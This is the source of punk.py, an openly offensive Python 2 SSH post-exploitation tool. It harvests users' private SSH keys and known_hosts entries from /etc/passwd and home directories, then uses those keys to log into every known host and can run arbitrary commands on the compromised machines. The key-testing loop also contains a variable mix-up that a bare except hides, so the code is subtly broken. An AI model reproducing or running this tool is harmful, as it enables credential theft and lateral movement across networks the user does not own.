#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#             |
#          \   |   /
#     .     \  |  /    .
#      `-.__|\/_\/|_.-'
#    .__  \ /     `./  
#       `-        @|
#      .-'`.  !!    -   punk.py - unix SSH post-exploitation 1337 tool
#     '     `  !  __.'  Copyright (C) 2018 < Giuseppe `r3vn` Corti >
#           _)___(      https://xfiltrated.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import sys
import threading
import Queue
import argparse

homesBlacklist = ["/dev/null","/var/empty","/bin","/sbin"]
shellBlacklist = ["/sbin/nologin","/bin/false","/usr/sbin/nologin","/bin/sync"]
knownHosts     = []
success        = []
users          = []
sshKeys        = []
CMD            = ""
   
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid, credentials) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
		self.credentials = credentials
 
	def run(self) :
		while True :
			host = None 
			try :
				host = self.queue.get(timeout=1)
 
			except 	Queue.Empty :
				return
 
			
			for user in users:
				for keys in sshKeys:
					try:
						if int(os.system("ssh -oBatchMode=yes -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oConnectTimeout=8 %s@%s -i %s -q exit" % (user,host,key ))) == 0:
							self.credentials.put(user+":"+host+":"+key)

							if user+":"+host+":"+key not in success:
								print "\033[92m[*]\033[0m Got \033[92m%s@%s\033[0m with \033[92m\"%s\"\033[0m key." % (user,host,key)
								success.append(user+":"+host+":"+key)
							
							if CMD != '':
								print "\033[92m[*]\033[0m Executing \033[92m%s\033[0m." % (CMD)
								os.system("ssh -oBatchMode=yes -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oConnectTimeout=8 %s@%s -i %s -q -t \"%s\" " % (user,host,key,CMD))



					except:
						pass
 
 
			self.queue.task_done()

class attack(object):


	def run(self):

		queue       = Queue.Queue()
		credentials = Queue.Queue()

		threads = []
		for i in range(1, len(knownHosts)) : # Number of threads
			worker = WorkerThread(queue, i, credentials) 
			worker.setDaemon(True)
			worker.start()
			threads.append(worker)

		for host in knownHosts:
			queue.put(host)

		queue.join()
		 
		# wait for all threads to exit 
		if not credentials.empty():
			out = (credentials.get()).split(":")
		else:
			return False
		 
		for item in threads :
			item.join()

		return out[0], out[1] # Output attack: user, host


def discovery(passwd, home_path):
	# Search users, SSH keys and known hosts

	if passwd:
		# Get users and home paths from passwd
		F = open("/etc/passwd",'r')

		for line in F:
			if not line.startswith('#'): # skip comments

				user  = line.split(":")[0]
				home  = line.split(":")[5]
				shell = line.split(":")[6].replace("\n","")

				if home not in homesBlacklist and shell not in shellBlacklist:

					users.append(user)

					#collect known hosts
					if os.path.isfile(home + "/.ssh/known_hosts"):
						FK = open(home + "/.ssh/known_hosts")
						for host in FK:
							if not host.find("|") >= 0: # secure known_hosts
								if host.find(",") >= 0:
									hostname = host.split(" ")[0].split(",")[1]
								else:
									hostname = host.split(" ")[0]
								if hostname not in knownHosts:
									knownHosts.append(hostname)
							else:
								print "\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home + "/.ssh/known_hosts\033[0m"
						FK.close()

					# check users with private keys
					if os.path.isfile(home + "/.ssh/id_rsa"): 
						#targets[user]=home + "/.ssh/id_rsa"  # username and home dir
						if home+"/.ssh/id_rsa" not in sshKeys:
							sshKeys.append(home + "/.ssh/id_rsa")
		F.close()

	# home directory scan
	for homes in os.listdir(home_path):
		if homes not in users:

			users.append(homes)

			if os.path.isfile(home_path+homes + "/.ssh/id_rsa"):
				#targets[homes] = homes + "/.ssh/id_rsa"
				if home_path+homes + "/.ssh/id_rsa" not in sshKeys:
					sshKeys.append(home_path+homes + "/.ssh/id_rsa")

			if os.path.isfile(home_path+homes + "/.ssh/known_hosts"):
				FK = open(home_path+homes + "/.ssh/known_hosts")
				for host in FK:
					if not host.find("|") >= 0: # secure known_hosts
						if host.find(",") >= 0:
							hostname = host.split(" ")[0].split(",")[1]
						else:
							hostname = host.split(" ")[0]
						if hostname not in knownHosts:
							knownHosts.append(hostname)
					else:
						print "\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home_path + homes + "/.ssh/known_hosts\033[0m"
				FK.close()
	
	return True

if __name__ == "__main__":

	print """\033[92m
             |
         \   |   /
    .     \  |  /    .
     `-.__|\/_\/|_.-'
   .__  \ /     `./  
      `-        @|
     .-'`.  !!    -   \033[90m-=[ \033[93mpunk.py - unix SSH post-exploitation 1337 tool\033[92m
    '     `  !  __.'  \033[90m-=[ \033[93mby `r3vn` ( tw: @r3vnn )\033[92m
          _)___(      \033[90m-=[ \033[93mhttps://xfiltrated.com\033[92m
        \n\033[0m"""


	parser = argparse.ArgumentParser()
	parser.add_argument('--home', help='custom home path',default="/home/")
	parser.add_argument('--run', help='run commands on compromised hosts',default="")
	parser.add_argument('--no-passwd', dest='passwd', action='store_false', default=True, help='skip passwd check')
	args = parser.parse_args()

	print "\033[92m[*]\033[0m enumerating valid users with ssh keys..."
	discovery(args.passwd, args.home)
	print "\033[92m[*]\033[0m Done."

	if len(sshKeys) <= 0:
		print "\033[93m[!]\033[0m No valid SSH keys found on the system."
		sys.exit()
	else:
		print "\033[92m[*]\033[0m SSH keys found:\n\033[92m"

		for key in sshKeys:
			print "\t" + key

	if len(users) <= 0:
		print "\n\033[93m[!]\033[0m No valid users found on the system."
		sys.exit()
	else:
		print "\n\033[92m[*]\033[0m Users found:\n\033[92m"

		for user in users:
			print "\t" + user #+ " :: " + targets[user]

	if len(knownHosts) <= 0:
		print "\n\033[93m[!]\033[0m No valid known hosts found on the system."
		sys.exit()

	else:
		print "\n\033[92m[*]\033[0m known hosts found:\n\033[92m"

		for host in knownHosts:
			print "\t"+host

	print "\n\033[92m[*]\033[0m Starting keys bruteforcing..."
	CMD = args.run
	Attack = attack()

	Attack.run()
	print "\033[92m[*]\033[0m Attack Complete!"



		

